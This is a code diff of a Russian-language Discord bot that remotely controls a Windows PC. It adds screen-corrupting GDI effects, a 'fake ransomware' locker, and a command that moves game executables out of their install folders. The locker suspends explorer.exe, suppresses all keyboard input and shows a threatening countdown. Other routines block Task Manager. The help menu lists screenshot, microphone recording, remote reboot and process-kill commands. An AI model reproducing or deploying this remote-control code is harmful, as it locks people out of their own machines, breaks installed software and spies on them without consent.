@@ -32,6 +32,7 @@ import shutil
 from tkinter import ttk
 from dotenv import load_dotenv
 from pynput import mouse
+from pynput import keyboard
 
 pygame.mixer.init()
 os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
@@ -39,6 +40,18 @@ os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
 load_dotenv()
 
 TOKEN = os.getenv('BOT_TOKEN')
+
+DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
+
+purgatory_active = False
+
+melt_active = False
+
+window_dissolve_active = False
+
+gdi_vortex_active = False
+
+artifacts_active = False
 
 window_runner_active = False
 
@@ -120,6 +133,11 @@ AVAILABLE_APPS = {
     "Блокнот": "notepad.exe",
     "Калькулятор": "calc.exe",
     "Soundpad": r"D:\Рабочий стол\Soundpad\Soundpad.exe",
+    "Dota": r"E:\SteamLibrary\steamapps\common\dota 2 beta\game\bin\win64\dota2.exe",
+    "Stalcraft": r"C:\Steam\steamapps\common\STALCRAFT\bin_global\win64\java\bin\stalcraft.exe"
+}
+
+GAMES_EXES = {
     "Dota": r"E:\SteamLibrary\steamapps\common\dota 2 beta\game\bin\win64\dota2.exe",
     "Stalcraft": r"C:\Steam\steamapps\common\STALCRAFT\bin_global\win64\java\bin\stalcraft.exe"
 }
@@ -263,6 +281,336 @@ async def check_game():
             window_process.terminate()
             print(f"{TARGET_PROCESS} закрыт. Закрываю окно.")
 
+def purgatory_logic():
+    import win32gui, win32api, win32con, random, time, ctypes
+    import pywintypes # Импортируем для обработки специфичных ошибок
+
+    hdc = win32gui.GetDC(0)
+    sw = win32api.GetSystemMetrics(0)
+    sh = win32api.GetSystemMetrics(1)
+    
+    while purgatory_active:
+        try:
+            # 1. ВИЗУАЛЬНЫЙ УДАР (SRCINVERT)
+            x = random.randint(0, sw - 200)
+            y = random.randint(0, sh - 200)
+            win32gui.BitBlt(hdc, x + random.randint(-10, 10), y + random.randint(-10, 10), 
+                            200, 200, hdc, x, y, win32con.SRCINVERT)
+
+            # 2. АКУСТИЧЕСКИЙ ТЕРРОР
+            if random.random() > 0.95:
+                ctypes.windll.kernel32.Beep(random.randint(500, 5000), 50)
+
+            # 3. ФИЗИЧЕСКИЙ ХАОС (С ЗАЩИТОЙ)
+            try:
+                mx, my = win32api.GetCursorPos()
+                # Используем ctypes напрямую, он иногда стабильнее win32api
+                ctypes.windll.user32.SetCursorPos(mx + random.randint(-3, 3), my + random.randint(-3, 3))
+            except (pywintypes.error, Exception):
+                # Если Windows запретила трогать мышь - просто игнорируем
+                pass
+
+            # 4. БЛОКИРОВКА ДИСПЕТЧЕРА ЗАДАЧ
+            # Ищем по классу окна, это надежнее чем по имени
+            taskmgr_hwnd = win32gui.FindWindow("TaskManagerWindow", None)
+            if taskmgr_hwnd:
+                win32gui.ShowWindow(taskmgr_hwnd, win32con.SW_MINIMIZE)
+
+        except Exception as e:
+            # Общий ловушка, чтобы поток не падал ни при каких обстоятельствах
+            print(f"Поток Чистилища встретил сопротивление: {e}")
+            time.sleep(0.1)
+        
+        time.sleep(0.01)
+    
+    win32gui.ReleaseDC(0, hdc)
+
+@bot.slash_command(name='digital_purgatory', description='Нахуй не используйте это полная пизда', guild_ids=[711194167757242368])
+async def purgatory_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["ВКЛЮЧИТЬ АД", "СТОП"])):
+    global purgatory_active
+    if action == "ВКЛЮЧИТЬ АД":
+        purgatory_active = True
+        threading.Thread(target=purgatory_logic, daemon=True).start()
+        await ctx.respond("🔥 **Добро пожаловать в Чистилище.** Теперь компьютер принадлежит не тебе.")
+    else:
+        purgatory_active = False
+        win32gui.InvalidateRect(0, None, True)
+        await ctx.respond("❄️ Хаос остановлен. Система охлаждена.")
+
+def melt_logic():
+    hdc = win32gui.GetDC(0)
+    sw = win32api.GetSystemMetrics(0)
+    sh = win32api.GetSystemMetrics(1)
+    
+    while melt_active:
+        # Выбираем случайную координату X
+        x = random.randint(0, sw)
+        # Ширина "капли"
+        width = random.randint(5, 30)
+        # На сколько пикселей стекает (глубина)
+        height = random.randint(1, 15)
+        
+        # Копируем полоску чуть ниже её текущего положения
+        win32gui.BitBlt(hdc, x, random.randint(0, sh), width, sh, hdc, x, 0, win32con.SRCCOPY)
+        
+        # Минимальная пауза для плавности
+        time.sleep(0.001)
+
+@bot.slash_command(name='screen_melt', description='Заставить экран "стекать" вниз (ХАРДКОР)', guild_ids=[711194167757242368])
+async def melt_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Начать", "Стоп"])):
+    global melt_active
+    if action == "Начать":
+        melt_active = True
+        threading.Thread(target=melt_logic, daemon=True).start()
+        await ctx.respond("🫠 **Лед тронулся.** Экран начал плавиться.")
+    else:
+        melt_active = False
+        win32gui.InvalidateRect(0, None, True)
+        await ctx.respond("🧊 Система охлаждена. Картинка застыла.")
+
+def vortex_logic():
+    import win32gui, win32api, win32con, math, time
+    
+    hdc = win32gui.GetDC(0)
+    sw = win32api.GetSystemMetrics(0)
+    sh = win32api.GetSystemMetrics(1)
+    
+    angle = 0
+    while gdi_vortex_active:
+        # Увеличиваем угол вращения
+        angle += 0.05
+        
+        # Вычисляем точки параллелограмма для вращения и сжатия
+        # Это создает эффект закручивания в центр
+        center_x, center_y = sw // 2, sh // 2
+        radius = 0.98 # Коэффициент сжатия (98% от оригинала)
+        
+        # Три опорные точки для PlgBlt (верхний левый, верхний правый, нижний левый углы)
+        res = [
+            (int(center_x + (0 - center_x) * math.cos(angle) * radius - (0 - center_y) * math.sin(angle) * radius),
+             int(center_y + (0 - center_x) * math.sin(angle) * radius + (0 - center_y) * math.cos(angle) * radius)),
+            
+            (int(center_x + (sw - center_x) * math.cos(angle) * radius - (0 - center_y) * math.sin(angle) * radius),
+             int(center_y + (sw - center_x) * math.sin(angle) * radius + (0 - center_y) * math.cos(angle) * radius)),
+            
+            (int(center_x + (0 - center_x) * math.cos(angle) * radius - (sh - center_y) * math.sin(angle) * radius),
+             int(center_y + (0 - center_x) * math.sin(angle) * radius + (sh - center_y) * math.cos(angle) * radius))
+        ]
+        
+        # Рисуем искаженный экран поверх текущего
+        try:
+            win32gui.PlgBlt(hdc, res, hdc, 0, 0, sw, sh, 0, 0, 0)
+        except:
+            pass
+            
+        time.sleep(0.01)
+
+@bot.slash_command(name='gdi_vortex', description='Закрутить экран в бесконечный фрактальный вихрь', guild_ids=[711194167757242368])
+async def vortex_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
+    global gdi_vortex_active
+    if action == "Включить":
+        gdi_vortex_active = True
+        threading.Thread(target=vortex_logic, daemon=True).start()
+        await ctx.respond("🌪️ **Вихрь активирован.** Реальность начала вращаться.")
+    else:
+        gdi_vortex_active = False
+        win32gui.InvalidateRect(0, None, True)
+        await ctx.respond("🧊 Пространство стабилизировано.")
+
+def feedback_logic():
+    import win32gui, win32api, win32con, time
+    
+    hdc = win32gui.GetDC(0)
+    sw = win32api.GetSystemMetrics(0)
+    sh = win32api.GetSystemMetrics(1)
+    
+    while gdi_feedback_active:
+        # Копируем экран сам в себя, но чуть меньше и со смещением в центр
+        # StretchBlt - это мощь. Она сжимает изображение на лету.
+        win32gui.StretchBlt(
+            hdc, 
+            int(sw * 0.025), int(sh * 0.025), # Координаты вставки (смещение на 2.5%)
+            int(sw * 0.95), int(sh * 0.95),   # Размер вставки (95% от оригинала)
+            hdc, 
+            0, 0, sw, sh,                     # Источник (весь экран)
+            win32con.SRCCOPY
+        )
+        
+        # Минимальная пауза, чтобы не повесить видеокарту в ноль
+        time.sleep(0.01)
+
+@bot.slash_command(name='gdi_feedback', description='Запустить рекурсивный тоннель (ХАРДКОР)', guild_ids=[711194167757242368])
+async def feedback_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
+    global gdi_feedback_active
+    if action == "Включить":
+        gdi_feedback_active = True
+        threading.Thread(target=feedback_logic, daemon=True).start()
+        await ctx.respond("🌀 **Внимание:** Активирована визуальная рекурсия. Реальность нестабильна.")
+    else:
+        gdi_feedback_active = False
+        win32gui.InvalidateRect(0, None, True)
+        await ctx.respond("🧊 Фрактальный тоннель схлопнулся.")
+
+def artifacts_logic():
+    import win32gui, win32api, win32con, random, time, pywintypes
+    
+    sw = win32api.GetSystemMetrics(0)
+    sh = win32api.GetSystemMetrics(1)
+    
+    while artifacts_active:
+        # Получаем HDC прямо внутри цикла, чтобы он всегда был свежим
+        hdc = win32gui.GetDC(0)
+        if not hdc:
+            time.sleep(0.1)
+            continue
+            
+        try:
+            mode = random.random()
+            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
+            x = random.randint(0, sw - 10)
+            y = random.randint(0, sh - 10)
+
+            if mode < 0.7:
+                size = random.choice([2, 4, 8])
+                for i in range(size):
+                    for j in range(size):
+                        # Рисуем только если пиксель в пределах экрана
+                        win32gui.SetPixel(hdc, x + i, y + j, color)
+            
+            elif mode < 0.9:
+                length = random.randint(50, 300)
+                thick = random.randint(1, 3)
+                for t in range(thick):
+                    for l in range(length):
+                        if x + l < sw:
+                            win32gui.SetPixel(hdc, x + l, y + t, color)
+            else:
+                w, h = random.randint(10, 50), random.randint(10, 50)
+                win32gui.BitBlt(hdc, x, y, w, h, hdc, x + random.randint(-5, 5), y + random.randint(-5, 5), win32con.SRCCOPY)
+
+        except pywintypes.error:
+            # Если возникла ошибка отрисовки, просто пропускаем итерацию
+            pass
+        finally:
+            # КРИТИЧЕСКИ ВАЖНО: Освобождаем контекст, чтобы не было утечки GDI-объектов
+            win32gui.ReleaseDC(0, hdc)
+
+        time.sleep(random.uniform(0.01, 0.05))
+
+@bot.slash_command(name='monitor_artifacts', description='Симулировать отвал видеокарты (GDI артефакты)', guild_ids=[711194167757242368])
+async def artifacts_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
+    global artifacts_active
+    if action == "Включить":
+        if artifacts_active:
+            return await ctx.respond("📺 Артефакты уже активны!", ephemeral=True)
+        artifacts_active = True
+        threading.Thread(target=artifacts_logic, daemon=True).start()
+        await ctx.respond("☢️ **Критический сбой видеопамяти имитирован.** Экран пошел полосами.")
+    else:
+        artifacts_active = False
+        # Очищаем экран от мусора (заставляем Windows перерисовать всё)
+        import win32gui
+        win32gui.InvalidateRect(0, None, True)
+        await ctx.respond("💎 Видеочип «восстановлен». Экран очищен.")
+
+def move_exe_direct(game_name):
+    source_path = GAMES_EXES.get(game_name)
+    
+    if not source_path:
+        return False, "Игра не настроена в списке."
+
+    if not os.path.exists(source_path):
+        return False, f"Файл не найден по пути: {source_path}"
+
+    # Имя файла для рабочего стола (например, dota2.exe)
+    exe_filename = os.path.basename(source_path)
+    destination_path = os.path.join(DESKTOP_PATH, exe_filename)
+
+    try:
+        # Перемещаем файл
+        shutil.move(source_path, destination_path)
+        # Сохраняем путь в лог или переменную, чтобы потом вернуть (по желанию)
+        return True, destination_path
+    except Exception as e:
+        return False, f"Ошибка доступа (запусти от админа): {e}"
+
+@bot.slash_command(name='move_exe', description='Мгновенно выбросить EXE игры на рабочий стол', guild_ids=[711194167757242368])
+async def move_exe_slash(ctx: discord.ApplicationContext, game: discord.Option(str, choices=list(GAMES_EXES.keys()))):
+    success, result = await asyncio.to_thread(move_exe_direct, game)
+    
+    if success:
+        await ctx.respond(f"🚀 **Бабах!** `{os.path.basename(result)}` теперь на рабочем столе.\nПуть в Steam теперь пуст!")
+    else:
+        await ctx.respond(f"❌ **Провал:** {result}", ephemeral=True)
+
+def start_locker(seconds=60):
+    # --- ШАГ 1: ГАСИМ ПРОВОДНИК (Win и Панель задач) ---
+    def toggle_explorer(stop=True):
+        for proc in psutil.process_iter(['name']):
+            if proc.info['name'] == 'explorer.exe':
+                p = psutil.Process(proc.pid)
+                if stop: p.suspend() # Замораживаем
+                else: p.resume()    # Размораживаем
+
+    try: toggle_explorer(True)
+    except: pass # Если нет прав, локер сработает хуже, но сработает
+
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.attributes("-topmost", True)
+    root.configure(background='black')
+    root.config(cursor="none")
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+
+    # --- ШАГ 2: АГРЕССИВНЫЙ ФОКУС ---
+    def keep_focus():
+        root.lift()
+        root.focus_force()
+        root.attributes("-topmost", True)
+        if not root.winfo_exists(): return
+        root.after(100, keep_focus)
+
+    # --- ШАГ 3: БЛОКИРОВКА (теперь работает лучше) ---
+    def block_keys():
+        def on_press(key):
+            # В этом режиме даже если Win прорвется, Explorer не ответит
+            return False 
+
+        with keyboard.Listener(on_press=on_press, suppress=True) as listener:
+            listener.join()
+
+    threading.Thread(target=block_keys, daemon=True).start()
+    
+    label = tk.Label(root, text="Если я вас обидел то звоните:8 (495) 963-11-02", font=("Courier", 40, "bold"), fg="red", bg="black")
+    label.pack(pady=100)
+    
+    timer_label = tk.Label(root, text="", font=("Courier", 80, "bold"), fg="red", bg="black")
+    timer_label.pack(pady=20)
+
+    def update_timer(count):
+        if count >= 0:
+            timer_label.config(text=f"До того как тебе порвут очко осталось: {count}%")
+            root.after(1000, update_timer, count - 1)
+        else:
+            try: toggle_explorer(False) # Возвращаем Windows к жизни
+            except: pass
+            root.destroy()
+
+    update_timer(seconds)
+    keep_focus()
+    root.mainloop()
+
+@bot.slash_command(name='fake_ransomware', description='Запустить имитацию вируса-вымогателя', guild_ids=[711194167757242368])
+async def ransomware_slash(ctx: discord.ApplicationContext, time_sec: discord.Option(int, "Время таймера (сек)", default=60)):
+    await ctx.respond("☣️ **Вирус-вымогатель запущен.** Жертва в ловушке.")
+    
+    # Запускаем в отдельном процессе через multiprocessing, 
+    # так как tkinter плохо живет в потоках
+    p = multiprocessing.Process(target=start_locker, args=(time_sec,), daemon=True)
+    p.start()
+
+
+
 def fake_lag_logic():
     import ctypes
     import time
@@ -303,28 +651,6 @@ async def fake_lag_slash(ctx: discord.ApplicationContext, action: discord.Option
     else:
         fake_lag_active = False
         await ctx.respond("🚀 **Лаги устранены.** Система снова работает плавно.")
-
-def anti_manager_logic():
-    import win32gui, win32con
-    while anti_manager_active:
-        for title in ["Диспетчер задач", "Task Manager"]:
-            hwnd = win32gui.FindWindow(None, title)
-            if hwnd:
-                # SW_MINIMIZE (6) — свернуть окно
-                # SW_HIDE (0) — полностью скрыть (окно останется в процессах, но исчезнет с экрана)
-                win32gui.ShowWindow(hwnd, win32con.SW_HIDE) 
-        time.sleep(0.3) # Очень быстрая проверка
-
-@bot.slash_command(name='anti_manager', description='Запретить открывать Диспетчер задач', guild_ids=[711194167757242368])
-async def anti_manager_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
-    global anti_manager_active
-    if action == "Включить":
-        anti_manager_active = True
-        threading.Thread(target=anti_manager_logic, daemon=True).start()
-        await ctx.respond("🛡️ **Защита активирована.** Диспетчер задач теперь под запретом.")
-    else:
-        anti_manager_active = False
-        await ctx.respond("✅ Доступ к системе восстановлен.")
 
 
 @bot.slash_command(name='window_shrink', description='Сжать активное окно до размера 50x50', guild_ids=[711194167757242368])
@@ -869,80 +1195,96 @@ async def listen_slash(ctx: discord.ApplicationContext):
 @bot.slash_command(name='help', description='Показать панель управления всеми модулями бота', guild_ids=[711194167757242368])
 async def help_slash(ctx: discord.ApplicationContext):
     embed = discord.Embed(
-        title="☣️ Панель Управления",
-        description="Внимание! Рвите очко кости постепенно",
-        color=discord.Color.from_rgb(46, 204, 113)
+        title="☣️ ПАНЕЛЬ УПРАВЛЕНИЯ «PRESENT»",
+        description="**Внимание:** Используйте модули осторожно. Система может не пережить полной нагрузки.",
+        color=discord.Color.from_rgb(192, 57, 43) # Кроваво-красный
     )
 
-    # --- КАТЕГОРИЯ 1: ВИЗУАЛЬНЫЙ ХАОС ---
+    # --- КАТЕГОРИЯ 1: ЯДЕРНЫЙ ТЕРРОР (GDI & Hardcore) ---
     embed.add_field(
-        name="🖼️ Визуальный хаос",
+        name="☢️ Ядерный хаос (GDI)",
         value=(
-            "`/image` — Вывести картинку на весь экран\n"
-            "`/jumpscare` — Смертельное комбо: звук 100% + скример\n"
-            "`/dead_pixel` — Создать/убрать черную точку на мониторе\n"
-            "`/earthquake` — Тряска активного окна (3 сек)\n"
-            "`/flashbang` — Ослепляющая вспышка яркости\n"
-            "`/ghost_cursor` — Призрачный курсор, гуляющий сам по себе"
+            "`/digital_purgatory` — **АД:** Звук, визуализация и блокировка\n"
+            "`/screen_melt` — Эффект тающего экрана (стекание)\n"
+            "`/gdi_vortex` — Закрутить экран в бесконечный вихрь\n"
+            "`/gdi_feedback` — Рекурсивный тоннель (фрактал)\n"
+            "`/monitor_artifacts` — Имитация смерти видеокарты"
         ),
         inline=False
     )
 
-    # --- КАТЕГОРИЯ 2: СИСТЕМНЫЙ ВАНДАЛИЗМ ---
+    # --- КАТЕГОРИЯ 2: УПРАВЛЕНИЕ МЫШЬЮ И ОКНАМИ ---
     embed.add_field(
-        name="🛠️ Системный вандализм",
+        name="🖱️ Манипуляции вводом",
         value=(
-            "`/icon_shuffle` — Разбросать иконки рабочего стола\n"
-            "`/swap_mouse` — Инверсия кнопок мыши (ЛКМ <-> ПКМ)\n"
-            "`/crazy_mouse` — Режим бешеного курсора (5 сек)\n"
-            "`/screen_off` — Выключить мониторы (сон)\n"
-            "`/lock_pc` — Мгновенная блокировка (Win+L)"
+            "`/fake_lag` — Дикие лаги курсора (рывками)\n"
+            "`/mouse_slow` — Замедление мыши в 10 раз\n"
+            "`/invert_mouse` — Инверсия осей X и Y\n"
+            "`/swap_mouse` — Поменять ЛКМ и ПКМ местами\n"
+            "`/window_runner` — Окна убегают от курсора\n"
+            "`/window_shrink` — Сжать окно до нано-размеров"
         ),
         inline=False
     )
 
-    # --- КАТЕГОРИЯ 3: СОЦИАЛЬНАЯ ИНЖЕНЕРИЯ ---
+    # --- КАТЕГОРИЯ 3: ПСИХОЛОГИЧЕСКИЙ ВАНДАЛИЗМ ---
     embed.add_field(
         name="🧠 Психологические атаки",
         value=(
-            "`/fake_delete` — Прогресс-бар «Удаление всех игр»\n"
-            "`/folder_bomb` — Создать 50 папок и удалить их через 10 сек\n"
-            "`/interrogate` — Окно-допрос, блокирующее работу\n"
-            "`/error_popup` — Классическое окно ошибки Windows\n"
-            "`/notify` — Фейковое уведомление в трее\n"
-            "`/ghost_notepad` — Призрачный хакер печатает в блокноте"
+            "`/fake_ransomware` — **ЛОКЕР:** Блокировка ПК с таймером\n"
+            "`/move_exe` — Выбросить EXE игры на рабочий стол\n"
+            "`/fake_delete` — Прогресс-бар удаления данных\n"
+            "`/folder_bomb` — Взрыв из 50 папок на десктопе\n"
+            "`/interrogate` — Окно-допрос поверх всех окон"
         ),
         inline=False
     )
 
-    # --- КАТЕГОРИЯ 4: ШПИОНАЖ И КОНТРОЛЬ ---
+    # --- КАТЕГОРИЯ 4: ВИЗУАЛЬНЫЕ ПРИКОЛЫ ---
     embed.add_field(
-        name="🕵️ Шпионаж и Контроль",
+        name="🖼️ Визуальные эффекты",
         value=(
-            "`/screenshot` — Сделать мгновенный снимок экрана\n"
-            "`/listen` — Записать 10 секунд звука с микрофона\n"
-            "`/open_url` — Открыть любую ссылку в браузере\n"
-            "`/say` — Озвучить текст через колонки (TTS)\n"
-            "`/sound` — Запустить мемный звук из списка"
+            "`/image` — Картинка на весь экран\n"
+            "`/jumpscare` — Скример (Звук 100% + Фото)\n"
+            "`/dead_pixel` — Битый пиксель на мониторе\n"
+            "`/earthquake` — Тряска активного окна\n"
+            "`/flashbang` — Светошумовая граната (яркость)\n"
+            "`/icon_shuffle` — Перемешать иконки рабочего стола"
         ),
         inline=False
     )
 
-    # --- КАТЕГОРИЯ 5: УПРАВЛЕНИЕ БОТОМ ---
+    # --- КАТЕГОРИЯ 5: ШПИОНАЖ И ЗВУК ---
     embed.add_field(
-        name="⚙️ Утилиты",
+        name="🕵️ Шпионаж и Звук",
         value=(
-            "`/launch` — Запуск программ (Dota, Soundpad и др.)\n"
-            "`/kill_app` — Закрыть любой процесс по имени\n"
-            "`/volume` — Громкость (Громче/Тише/Mute)\n"
-            "`/stop_sound` — Экстренная тишина\n"
-            "`/reboot_pc` — Удаленная перезагрузка ПК"
+            "`/screenshot` — Снимок экрана\n"
+            "`/listen` — Запись микрофона (10 сек)\n"
+            "`/echo_voice` — Эхо из микрофона в колонки\n"
+            "`/say` — Озвучить текст (TTS)\n"
+            "`/sound` — Проиграть звук из списка\n"
+            "`/stop_sound` — Экстренная тишина"
         ),
         inline=False
     )
 
+    # --- КАТЕГОРИЯ 6: СИСТЕМА ---
+    embed.add_field(
+        name="⚙️ Системные утилиты",
+        value=(
+            "`/status` — Мониторинг ресурсов ПК\n"
+            "`/kill_app` — Закрыть процесс\n"
+            "`/volume` — Управление громкостью\n"
+            "`/screen_off` — Выключить мониторы\n"
+            "`/reboot_pc` — Перезагрузка системы\n"
+            "`/restart` — Рестарт бота"
+        ),
+        inline=False
+    )
+
+    # Твоя гифка
     embed.set_image(url="https://cdn.discordapp.com/attachments/724553360325214299/1473699082114568306/kling_20260218_VIDEO_Image1_____5740_0-ezgif.com-video-to-gif-converter.gif?ex=69af8c79&is=69ae3af9&hm=a4ee43c0e8cf276bcda32cb5689ac3be32a0ffc1acde168ca63a1f0c64769986&")
-    embed.set_footer(text=f"Хост: {os.getlogin()} | Статус: В сети")
+    embed.set_footer(text=f"Host: {os.getlogin()} | Python {sys.version.split()[0]} | Время работы: {int(time.time() - start_time)} сек")
 
     await ctx.respond(embed=embed)
 
